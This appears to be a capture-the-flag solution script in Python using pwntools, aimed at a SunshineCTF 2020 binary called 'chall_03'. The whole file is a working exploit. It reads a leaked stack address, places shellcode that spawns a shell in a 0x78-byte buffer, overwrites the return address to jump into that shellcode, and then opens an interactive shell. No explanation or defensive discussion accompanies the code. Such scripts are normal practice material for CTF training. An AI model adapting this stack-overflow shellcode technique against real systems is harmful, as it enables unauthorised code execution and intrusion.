#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_03')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30003)
else:
    io = process(context.binary.path)    
print(io.recvline())
io.sendline('throwaway')
response = str(io.recvline()) # 'b"I'll make it: 0x000xyz\\n"'
stack_address = re.search("0x[0-9a-f]+", response).group()

payload = asm(shellcraft.sh())
buffer = 'A' * (0x78 - len(payload))
exploit = flat(payload, buffer, p64(int(stack_address, 16)))

print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()
